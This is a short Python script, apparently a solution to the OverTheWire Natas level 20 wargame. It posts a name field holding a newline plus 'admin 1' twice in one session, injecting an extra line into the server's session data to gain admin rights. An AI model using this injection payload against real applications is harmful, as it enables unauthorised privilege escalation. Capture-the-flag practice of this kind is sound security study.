import requests
from requests.auth import HTTPBasicAuth

url='http://natas20.natas.labs.overthewire.org/'

auth = HTTPBasicAuth('user', 'password')

session = requests.Session()

payload = 'admin\nadmin 1'

response = session.post(url, auth=auth, data={'name': payload})

response = session.post(url, auth=auth, data={'name': payload})

print(response.text)
